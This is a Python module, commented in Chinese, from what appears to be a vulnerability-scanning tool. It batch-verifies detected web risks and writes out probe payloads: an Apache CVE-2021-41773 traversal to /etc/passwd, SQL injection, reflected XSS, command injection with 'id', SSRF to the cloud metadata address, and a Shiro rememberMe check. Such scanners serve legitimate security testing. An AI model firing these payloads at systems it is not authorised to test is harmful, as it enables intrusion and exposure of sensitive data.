#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""验证队列: 检测产出的风险 → 自动构造探测 → 批量执行 → 收敛成结论。

和 verify.py 的分工:
  verify.py  手搓一次请求, 原样返回响应, 人自己看;
  vqueue.py  批量自动判定, 必须收敛成 确认 / 疑似 / 未命中 / 需人工 四档。

★ 判定原则: 只做"无害验证"。
  读一个公开路径(/etc/passwd、.env、actuator/env)算无害 —— 它和浏览器直接访问
  没区别, 能读到就说明问题已经存在; 但"执行命令"类 POC(ThinkPHP RCE 之类)不自动发,
  一律标「需人工」, 因为一次自动批量跑出去可能就把机器打挂了。

★ 为什么不复用 detect.py 的核查逻辑: 检测是"发现"(看响应头/指纹猜), 这里是"确认"
  (拿着具体 URL 和载荷复现)。两者的输入输出都不同, 混在一起会互相牵制。
"""
import concurrent.futures as cf
import json
import re
import socket
import ssl
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from core import store
from core import util

MAX_WORKERS = 6
REQ_TIMEOUT = 10
SNIP = 600            # 回传前端的响应片段长度

# ── 风险类型 → 探测策略 ────────────────────────────────────────────
# 顺序匹配, 第一个命中即用。写全名而不是模糊匹配, 因为 detect.py 产出的 kind 是
# 固定枚举, 模糊匹配反而会把"命令注入"错配到"命令执行"这种相近词上。
STRATEGY = [
    (r"^安全响应头缺失$", "sec_headers"),
    (r"^版本信息泄露$", "recheck_version"),
    (r"^目录列举$", "dir_listing"),
    (r"^(Git 仓库暴露|SVN 元数据暴露|环境变量文件暴露|备份文件暴露|调试页面暴露|"
     r"Actuator 敏感端点|JMX 控制台暴露|接口文档暴露|目录索引文件暴露|服务状态页暴露)$",
     "path_expose"),
    (r"^(自签名证书|证书已过期|证书即将过期|弱 TLS 协议|TLS 握手异常)$", "tls"),
    (r"^受保护路径可枚举$", "path_protected"),
    (r"^(目标不可达|核查失败)$", "skip"),
    (r"^Apache 路径穿越$", "apache_traversal"),
    (r"^Apache 版本过旧$", "recheck_version"),
    (r"^Nginx 版本过旧$", "recheck_version"),
    (r"^PHP", "recheck_version"),
    (r"Shiro", "shiro"),
    (r"ThinkPHP", "manual"),
    (r"^(Jenkins 暴露|Spring Boot 端点)$", "path_expose"),
    (r"注入", "sqli"),
    (r"跨站脚本", "xss"),
    (r"遍历", "traversal"),
    (r"命令", "cmdi"),
    (r"SSRF", "ssrf"),
    (r"越权|上传", "manual"),
]

# 暴露路径的内容特征: 命中才算"真的读到了", 只看状态码会把自定义 404 页当成功
SIG = {
    "git_config": (r"\[core\]|repositoryformatversion", "Git 配置节"),
    "svn": (r"dir\n|svn://", "SVN entries 结构"),
    "dotenv": (r"(?m)^[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S", "环境变量键值对"),
    "zip": (r"^PK\x03\x04", "ZIP 文件头"),
    "sql": (r"CREATE TABLE|INSERT INTO|MySQL dump|-- Dump", "SQL 转储语句"),
    "phpinfo": (r"PHP Version|phpinfo\(\)|PHP License", "phpinfo 页面"),
    "actuator": (r'"propertySources"|"activeProfiles"|"status"\s*:\s*"UP"', "Actuator JSON"),
    "swagger": (r'"swagger"\s*:|"openapi"\s*:', "OpenAPI 定义"),
    "ds_store": (r"Bud1", "DS_Store 结构"),
    "status": (r"Total Accesses|Active connections|server status|nginx_status", "状态页"),
    "jmx": (r"JBoss|JMX|Administration Console|Web Console", "JMX 控制台页面"),
    "listing": (r"Index of /|Directory listing for", "目录索引页"),
}

# 路径类风险的 kind → 用哪条特征
PATH_SIG = {
    "Git 仓库暴露": ["git_config"],
    "SVN 元数据暴露": ["svn"],
    "环境变量文件暴露": ["dotenv"],
    "备份文件暴露": ["zip", "sql", "dotenv"],
    "调试页面暴露": ["phpinfo"],
    "Actuator 敏感端点": ["actuator"],
    "接口文档暴露": ["swagger"],
    "目录索引文件暴露": ["ds_store"],
    "服务状态页暴露": ["status"],
    "JMX 控制台暴露": ["jmx"],
    "Jenkins 暴露": ["jmx", "listing"],
    "Spring Boot 端点": ["actuator"],
}

# 主动探测用的注入载荷。只用"能看出回显"的, 不用盲注爆数据的那种
INJ = {
    "sqli": ("'", "' AND '1'='2"),
    "xss": ("<svg/onload=alert(1)>", ""),
    "traversal": ("../../../../../../etc/passwd", "../../../../../../etc/passwd"),
    "cmdi": (";id", "|id"),
}
# 判定用的响应特征
ECHO = {
    "traversal": (r"root:.*:0:0:", "读到了 /etc/passwd 内容"),
    "cmdi": (r"uid=\d+\(|gid=\d+\(", "命令执行回显"),
    "ssrf": (r"ami-id|instance-id|localhost|127\.0\.0\.1", "内网响应特征"),
}


# ══════════════════════════════════════════════════════════ 地址处理

def _to_url(target, port=0):
    """把 risk.target / asset.addr 归一成完整 URL。

    三种来源: Web 资产的 'http://h:8080/'、Path 资产的 'h/admin'、子域 'h'。
    ★ 端口必须补回去 —— Path 资产的 addr 里没有端口, 端口单独存在 asset.port 上,
      漏了就会去连 80, 内网非标端口全部连不上。
    """
    t = (target or "").strip()
    if not t:
        return ""
    p = int(port or 0)
    if re.match(r"^https?://", t, re.I):
        # 已有 scheme 但没写端口时, 用资产上的端口补 —— 检测模块产出的
        # "http://1.2.3.4/" 往往是 80 端口的默认拼接, 实际服务在 8080/3910 上。
        u = urlsplit(t)
        if p and not u.port:
            netloc = u.hostname or ""
            if ":" in netloc:      # IPv6
                netloc = "[%s]" % netloc
            netloc = "%s:%d" % (netloc, p)
            return urlunsplit((u.scheme, netloc, u.path, u.query, u.fragment))
        return t
    if p in (443, 8443, 9443):
        scheme = "https"
    elif p:
        scheme = "http"
    else:
        scheme = "http" if re.match(r"^\d+\.\d+\.\d+\.\d+", t) else "https"
    head, _, rest = t.partition("/")
    if p and not re.search(r":\d+$", head):
        head = "%s:%d" % (head, p)
    return "%s://%s%s" % (scheme, head, ("/" + rest) if rest else "")


def _split_port(url):
    u = urlsplit(url)
    port = u.port or (443 if u.scheme == "https" else 80)
    return u, port


def _inject(url, value, param=None):
    """把载荷塞进 URL 的查询串。param 为 None 时塞进第一个参数。"""
    u = urlsplit(url)
    pairs = parse_qsl(u.query, keep_blank_values=True)
    if not pairs:
        return ""
    out, hit = [], False
    for k, v in pairs:
        if not hit and (param is None or k == param):
            out.append((k, v + value))
            hit = True
        else:
            out.append((k, v))
    return urlunsplit((u.scheme, u.netloc, u.path, urlencode(out), u.fragment))


# ══════════════════════════════════════════════════════════ 构造探测

def _risk_url(risk):
    """风险的完整 URL。Path 资产的 target 是 'host/path', 端口在 asset 上。"""
    port = 0
    aid = risk.get("asset_id") or 0
    if aid:
        a = store.q1("SELECT port, kind FROM atk_asset WHERE id=?", (int(aid),))
        if a:
            port = a["port"]
    return _to_url(risk.get("target"), port)


def build(risk):
    """风险 → probe。返回 None 表示这条风险没法自动探测。"""
    kind = risk.get("kind") or ""
    url = _risk_url(risk)
    if not url:
        return None
    expect = ""
    for pat, exp in STRATEGY:
        if re.search(pat, kind):
            expect = exp
            break
    if not expect:
        # 兜底: 有 URL 就重放一次, 至少能确认"目标还活着、现象还在"
        expect = "recheck_version" if url else "manual"

    base = {"expect": expect, "kind": kind, "url": url}
    u, port = _split_port(url)
    home = "%s://%s/" % (u.scheme, u.netloc)

    if expect == "sec_headers":
        missing = _missing_headers(risk.get("evidence") or "", u.scheme)
        if not missing:
            return None
        return dict(base, reqs=[{"method": "GET", "url": url}],
                    meta={"missing": missing})

    if expect == "tls":
        return dict(base, reqs=[], meta={"host": u.hostname, "port": port})

    if expect in ("path_expose", "path_protected", "dir_listing"):
        return dict(base, reqs=[{"method": "GET", "url": url}],
                    meta={"sig": PATH_SIG.get(kind, [])})

    if expect == "apache_traversal":
        # CVE-2021-41773: 读 /etc/passwd 就能证明穿越成立, 不需要打 RCE
        return dict(base,
                    reqs=[{"method": "GET", "url": home + "cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"}],
                    meta={"sig": ["passwd"]})

    if expect == "shiro":
        return dict(base, reqs=[{"method": "GET", "url": home,
                                 "headers": {"Cookie": "rememberMe=atkprobe"}}],
                    meta={"sig": ["shiro"]})

    if expect == "recheck_version":
        return dict(base, reqs=[{"method": "GET", "url": url}], meta={"sig": []})

    if expect in ("sqli", "xss", "traversal", "cmdi"):
        v1, v2 = INJ[expect]
        u1, u2 = _inject(url, v1), _inject(url, v2) if v2 else ""
        if not u1:
            # 首页没有查询参数 —— 注入类风险必须指定参数才有意义, 交给人工
            return dict(base, reqs=[], expect="manual",
                        meta={"why": "目标 URL 没有可注入的查询参数, 请在验证页手工填参数"})
        reqs = [{"method": "GET", "url": url, "label": "基线"},
                {"method": "GET", "url": u1, "label": "载荷"}]
        if u2:
            reqs.append({"method": "GET", "url": u2, "label": "对照"})
        return dict(base, reqs=reqs, meta={"payload": v1})

    if expect == "ssrf":
        u1 = _inject(url, "http://169.254.169.254/latest/meta-data/")
        if not u1:
            return dict(base, reqs=[], expect="manual", meta={"why": "URL 无查询参数, 请手工指定注入点"})
        return dict(base, reqs=[{"method": "GET", "url": url}, {"method": "GET", "url": u1}],
                    meta={"payload": "169.254.169.254"})

    return dict(base, reqs=[], expect="manual", meta={"why": "该类风险需要人工构造请求"})


def _missing_headers(evidence, scheme):
    """从证据文本里还原缺失的头: 证据形如 '缺少 HSTS、X-Frame-Options'。"""
    KEY = {"HSTS": "strict-transport-security", "CSP": "content-security-policy",
           "X-Frame-Options": "x-frame-options",
           "X-Content-Type-Options": "x-content-type-options",
           "Referrer-Policy": "referrer-policy"}
    out = []
    for name, key in KEY.items():
        if name in (evidence or ""):
            if name == "HSTS" and scheme != "https":
                continue
            out.append([key, name])
    return out


# ══════════════════════════════════════════════════════════ 执行

def _fire(req):
    """发一次请求。异常也返回结构化结果 —— 批量执行里一条失败不能中断整队。"""
    t0 = time.time()
    try:
        r = util.session().request(
            req.get("method", "GET"), req["url"],
            headers=req.get("headers") or {},
            data=(req.get("body") or "").encode("utf-8") or None,
            timeout=req.get("timeout") or REQ_TIMEOUT,
            allow_redirects=True, verify=False,
        )
        body = r.text or ""
        return {"ok": True, "status": r.status_code,
                "ms": int((time.time() - t0) * 1000),
                "len": len(r.content or b""), "body": body[:40000],
                "headers": {k.lower(): v for k, v in r.headers.items()}}
    except Exception as e:
        return {"ok": False, "status": 0, "ms": int((time.time() - t0) * 1000),
                "len": 0, "body": "", "headers": {}, "error": str(e)[:150]}


def _tls_probe(host, port):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=6) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as sk:
                cert = sk.getpeercert() or {}
                ver = sk.version()
    except Exception as e:
        return {"error": str(e)[:120]}
    sub = str(cert.get("subject", ""))
    iss = str(cert.get("issuer", ""))
    out = {"version": ver, "self_signed": sub == iss and bool(sub),
           "subject": sub[:160], "issuer": iss[:160], "days_left": None,
           "not_after": cert.get("notAfter", "")}
    try:
        out["days_left"] = int((ssl.cert_time_to_seconds(cert["notAfter"]) - time.time()) // 86400)
    except Exception:
        pass
    return out


def _judge(probe, res):
    """判定。返回 (verdict, note, 代表响应)。"""
    expect = probe.get("expect")
    meta = probe.get("meta") or {}

    if expect == "skip":
        return "未命中", "该类风险不做主动探测(目标本身不可达)", None
    if expect == "manual":
        return "需人工", meta.get("why") or "该类风险需要人工构造请求", None
    if not probe.get("reqs"):
        return "需人工", meta.get("why") or "没有可自动执行的请求", None

    r0 = res[0] if res else {"ok": False, "error": "无响应"}
    if not r0.get("ok"):
        return "未命中", "请求失败: " + str(r0.get("error"))[:120], r0

    body = r0.get("body") or ""
    hdr = r0.get("headers") or {}
    st = r0.get("status") or 0

    # ---- 响应头复查
    if expect == "sec_headers":
        missing = meta.get("missing") or []
        still = [n for k, n in missing if not hdr.get(k)]
        if not still:
            return "误报", "复查时 %s 均已配置" % "、".join(n for _, n in missing), r0
        if len(still) < len(missing):
            return "确认", "%s 已补, 但 %s 仍缺失" % (
                "、".join(n for _, n in missing if n not in still), "、".join(still)), r0
        return "确认", "%s 仍未配置 (HTTP %d)" % ("、".join(still), st), r0

    # ---- TLS 复查
    if expect == "tls":
        ti = _tls_probe(meta.get("host"), meta.get("port"))
        if ti.get("error"):
            return "确认", "重新握手仍失败: " + ti["error"], None
        dl = ti.get("days_left")
        if ti.get("self_signed"):
            return "确认", "证书仍是自签名 (issuer == subject)", None
        if dl is not None and dl < 0:
            return "确认", "证书已过期 %d 天 (notAfter %s)" % (-dl, ti.get("not_after")), None
        if dl is not None and dl <= 30:
            return "确认", "证书 %d 天后到期 (notAfter %s)" % (dl, ti.get("not_after")), None
        if ti.get("version") in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
            return "确认", "仍可协商 " + str(ti.get("version")), None
        return "误报", "复查时证书与协议均正常 (%s, 剩 %s 天)" % (ti.get("version"), dl), None

    # ---- 路径类: 看状态码 + 内容特征
    if expect in ("path_expose", "path_protected", "dir_listing"):
        if st in (404, 410):
            return "误报", "复查返回 HTTP %d, 路径已不存在" % st, r0
        if expect == "path_protected":
            if st in (401, 403):
                return "确认", "路径存在且受保护 (HTTP %d), 可继续尝试绕过" % st, r0
            if st == 200:
                return "疑似", "现在直接返回 200, 鉴权可能已失效", r0
            return "未命中", "HTTP %d" % st, r0
        if st in (401, 403):
            return "疑似", "HTTP %d: 路径存在但拒绝访问" % st, r0
        hits = [SIG[k][1] for k in meta.get("sig") or [] if SIG.get(k) and re.search(SIG[k][0], body, re.I)]
        if hits:
            return "确认", "读到 %s (HTTP %d, %dB)" % ("/".join(hits), st, r0.get("len") or 0), r0
        if st == 200:
            return "疑似", "返回 200 但内容不含预期特征, 可能是自定义错误页", r0
        return "未命中", "HTTP %d" % st, r0

    # ---- Apache 路径穿越
    if expect == "apache_traversal":
        if re.search(r"root:.*:0:0:", body):
            return "确认", "路径穿越成立, 已读到 /etc/passwd", r0
        if st in (400, 403, 404):
            return "误报", "HTTP %d: 未受 CVE-2021-41773 影响" % st, r0
        return "未命中", "HTTP %d, 响应无 passwd 特征" % st, r0

    # ---- Shiro
    if expect == "shiro":
        setc = hdr.get("set-cookie", "")
        if "rememberme=deleteme" in setc.lower():
            return "确认", "rememberMe 回显 deleteMe, 默认密钥反序列化成立", r0
        if "shiro" in (body + setc).lower():
            return "疑似", "响应含 Shiro 特征但未见 rememberMe 回显", r0
        return "未命中", "未检测到 rememberMe 回显", r0

    # ---- 注入类
    if expect == "sqli":
        base_r, pay_r = res[0], res[1] if len(res) > 1 else None
        ctl_r = res[2] if len(res) > 2 else None
        if not pay_r or not pay_r.get("ok"):
            return "未命中", "载荷请求失败", r0
        # 时间盲注: 载荷明显慢, 对照不慢
        if pay_r.get("ms", 0) > 2500 and (not ctl_r or ctl_r.get("ms", 0) < 1200):
            return "确认", "时间盲注: 载荷 %dms vs 对照 %dms" % (
                pay_r.get("ms"), (ctl_r or {}).get("ms", 0)), pay_r
        lb, lp = base_r.get("len") or 0, pay_r.get("len") or 0
        lc = (ctl_r or {}).get("len") or 0
        if ctl_r and lb and abs(lp - lc) > max(24, lb * 0.05) and abs(lc - lb) <= max(16, lb * 0.03):
            return "确认", "布尔差异: 载荷 %dB vs 对照 %dB (基线 %dB)" % (lp, lc, lb), pay_r
        if abs(lp - lb) > max(64, lb * 0.2):
            return "疑似", "载荷响应长度变化较大 (%dB → %dB), 需人工确认" % (lb, lp), pay_r
        return "未命中", "真/假载荷响应无稳定差异", pay_r

    if expect == "xss":
        pay_r = res[1] if len(res) > 1 else r0
        payload = meta.get("payload") or ""
        pb = pay_r.get("body") or ""
        if payload and payload in pb:
            return "确认", "载荷原样反射到响应中", pay_r
        # 有些框架会把参数原样回显但保持 URL 编码, 这仍然是可控反射点
        from urllib.parse import quote
        enc = quote(payload, safe="")
        if payload and enc and enc in pb:
            return "疑似", "载荷以 URL 编码形式反射, 需确认是否会被二次解码", pay_r
        esc = payload.replace("<", "&lt;").replace(">", "&gt;")
        if payload and esc in pb:
            return "疑似", "载荷被 HTML 转义后反射, 需确认上下文能否闭合", pay_r
        return "未命中", "响应中未出现载荷", pay_r

    if expect in ("traversal", "cmdi", "ssrf"):
        pat, why = ECHO[expect]
        for r in res[1:] or res:
            if r.get("ok") and re.search(pat, r.get("body") or "", re.I):
                return "确认", why, r
        if expect == "ssrf":
            pay_r = res[1] if len(res) > 1 else r0
            if pay_r.get("ok") and pay_r.get("status") == 200 and (pay_r.get("len") or 0) > 0:
                if abs((pay_r.get("len") or 0) - (r0.get("len") or 0)) > 32:
                    return "疑似", "内网地址返回了不同内容, 需人工确认是否为 SSRF", pay_r
        return "未命中", "响应中未出现预期回显", res[1] if len(res) > 1 else r0

    if expect == "recheck_version":
        blob = (hdr.get("server", "") + " " + hdr.get("x-powered-by", "") + " " + body[:3000])
        if re.search(r"\d+\.\d+", hdr.get("server", "") + hdr.get("x-powered-by", "")):
            return "确认", "版本仍在响应头中暴露: %s" % (hdr.get("server") or hdr.get("x-powered-by"))[:80], r0
        return "误报", "复查时响应头已无版本号", r0

    return "未命中", "无匹配的判定规则", r0


# ══════════════════════════════════════════════════════════ 队列

def enqueue(task_id, risk_ids=None, levels=None):
    """把风险转成队列条目。已入队的跳过, 避免重复点击出现两条。"""
    tid = int(task_id)
    risks = store.risk_list(tid)
    ids = set(int(x) for x in (risk_ids or []) if str(x).strip().isdigit())
    lv = set(levels or [])
    out = {"added": 0, "skipped": 0, "unprobeable": 0, "kinds": {}}
    for r in risks:
        if ids and r["id"] not in ids:
            continue
        if not ids and r["status"] != "待确认":
            continue
        if lv and r["level"] not in lv:
            continue
        if store.vq_has_risk(tid, r["id"]):
            out["skipped"] += 1
            continue
        pr = build(r)
        if not pr:
            out["unprobeable"] += 1
            continue
        store.vq_add(tid, r["id"], r["kind"], r["level"], pr["url"], pr["expect"], pr)
        out["added"] += 1
        out["kinds"][pr["expect"]] = out["kinds"].get(pr["expect"], 0) + 1
    return out


def _worker(run_id, task_id, vids):
    try:
        rows = [store.vq_get(v) for v in vids]
        rows = [r for r in rows if r]
        store.run_patch(run_id, total=len(rows), status="running")
        store.run_log(run_id, "开始执行 %d 条探测" % len(rows))

        def one(row):
            probe = json.loads(row["probe"] or "{}")
            store.vq_patch(row["id"], status="running")
            res = []
            for req in probe.get("reqs") or []:
                if not req.get("url"):
                    continue
                ok, reason, _ = util.scope_check(urlsplit(req["url"]).hostname or "")
                if not ok:
                    res.append({"ok": False, "error": reason, "status": 0, "ms": 0, "len": 0,
                                "body": "", "headers": {}})
                    break
                res.append(_fire(req))
            try:
                verdict, note, rep = _judge(probe, res)
            except Exception as e:
                verdict, note, rep = "未命中", "判定异常: " + str(e)[:100], (res[0] if res else None)
            rep = rep or (res[0] if res else {})
            store.vq_patch(
                row["id"], status="done", verdict=verdict, note=note,
                resp_status=rep.get("status") or 0, resp_ms=rep.get("ms") or 0,
                resp_len=rep.get("len") or 0,
                resp_snip=(rep.get("body") or "")[:SNIP], ran_at=store.now(),
            )
            # 结论直接回写风险状态 —— 队列跑完不用再手工点一遍
            if row["risk_id"]:
                if verdict == "确认":
                    store.risk_mark(row["risk_id"], "已确认")
                elif verdict == "未命中":
                    store.risk_mark(row["risk_id"], "误报")
            return verdict

        tally = {}
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = [ex.submit(one, r) for r in rows]
            for f in cf.as_completed(futs):
                v = f.result()
                tally[v] = tally.get(v, 0) + 1
                store.run_incr(run_id)
                store.run_patch(run_id, stage="已判定 %d/%d" % (
                    sum(tally.values()), len(rows)))
        store.task_touch(task_id)
        store.run_patch(run_id, status="completed", stage="完成", ended_at=store.now(),
                        stats=tally)
        store.run_log(run_id, "执行完成: " + ", ".join("%s %d" % (k, v) for k, v in tally.items()))
    except Exception as e:
        store.run_patch(run_id, status="failed", error=str(e)[:200], ended_at=store.now())
        store.run_log(run_id, "异常: %s" % e)


def run(task_id, vids=None):
    """执行队列。vids 为空时跑所有 pending。"""
    tid = int(task_id)
    last = store.run_latest(tid, "verify")
    if last and last["status"] in ("queued", "running"):
        raise ValueError("该任务已有验证在跑, 等它结束")
    if vids:
        rows = [store.vq_get(v) for v in vids]
        rows = [r for r in rows if r and r["task_id"] == tid]
    else:
        rows = store.vq_list(tid, "pending")
    if not rows:
        raise ValueError("队列里没有待执行的项")
    ids = [r["id"] for r in rows]
    rid = store.run_new(tid, "verify", len(ids))
    import threading
    threading.Thread(target=_worker, args=(rid, tid, ids), daemon=True,
                     name="atk-vq-%s" % rid).start()
    return rid, len(ids)


def set_verdict(vid, verdict):
    """人工改判。改了就把风险状态一起同步 —— 否则列表和队列会互相矛盾。"""
    if verdict not in ("确认", "疑似", "未命中", "需人工"):
        raise ValueError("verdict 只能是 确认 / 疑似 / 未命中 / 需人工")
    row = store.vq_get(vid)
    if not row:
        raise ValueError("队列项不存在")
    store.vq_patch(vid, verdict=verdict, status="done",
                   note=(row["note"] or "") + " · 人工改判", ran_at=store.now())
    if row["risk_id"]:
        if verdict == "确认":
            store.risk_mark(row["risk_id"], "已确认")
        elif verdict == "未命中":
            store.risk_mark(row["risk_id"], "误报")
        else:
            store.risk_mark(row["risk_id"], "待确认")
    return {"ok": True}


def rows(task_id):
    """队列列表 + 每条附带风险信息, 前端不用再查一遍。"""
    out = []
    for r in store.vq_list(task_id):
        r = dict(r)
        try:
            r["probe"] = json.loads(r["probe"] or "{}")
        except Exception:
            r["probe"] = {}
        out.append(r)
    return out
